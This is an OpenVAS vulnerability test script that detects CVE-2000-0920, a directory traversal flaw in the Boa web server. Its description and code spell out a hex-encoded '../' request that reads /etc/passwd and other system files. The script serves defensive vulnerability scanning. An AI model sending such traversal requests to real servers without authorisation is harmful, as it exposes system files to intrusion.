###############################################################################
# OpenVAS Vulnerability Test
# $Id: httpd_boa.nasl 13964 2019-03-01 14:30:34Z cfischer $
#
# Boa file retrieval
#
# Authors:
# Thomas Reinke <reinke@cvs.nessus.org>
#
# Copyright:
# Copyright (C) 2000 Thomas Reinke
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2,
# as published by the Free Software Foundation
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.10527");
  script_version("$Revision: 13964 $");
  script_tag(name:"last_modification", value:"$Date: 2019-03-01 15:30:34 +0100 (Fri, 01 Mar 2019) $");
  script_tag(name:"creation_date", value:"2005-11-03 14:08:04 +0100 (Thu, 03 Nov 2005)");
  script_bugtraq_id(1770);
  script_tag(name:"cvss_base", value:"5.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:N/A:N");
  script_cve_id("CVE-2000-0920");
  script_name("Boa file retrieval");
  script_category(ACT_ATTACK);
  script_copyright("This script is Copyright (C) 2000 Thomas Reinke");
  script_family("Remote file access");
  script_dependencies("gb_get_http_banner.nasl", "os_detection.nasl");
  script_mandatory_keys("Boa/banner");

  script_tag(name:"solution", value:"Upgrade to a latest version of the server.");

  script_tag(name:"summary", value:"The remote Boa server allows an attacker to read arbitrary files
  on the remote web server, prefixing the pathname of the file with hex-encoded ../../..

  Example:

  GET /%2e%2e/%2e%2e/%2e%2e/etc/passwd

  will return /etc/passwd.");

  script_tag(name:"qod_type", value:"remote_vul");
  script_tag(name:"solution_type", value:"VendorFix");

  script_xref(name:"URL", value:"http://www.boa.org");

  exit(0);
}

include("host_details.inc");
include("http_func.inc");
include("misc_func.inc");

port = get_http_port(default:80);
files = traversal_files();

foreach pattern(keys(files)) {

  file = files[pattern];

  url = string("/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/" + file);
  req = http_get(item:url, port:port);
  res = http_send_recv(port:port, data:req);

  if(egrep(string:res, pattern:pattern)) {
    report = report_vuln_url(port:port, url:url);
    security_message(port:port, data:report);
    exit(0);
  }
}

exit(99);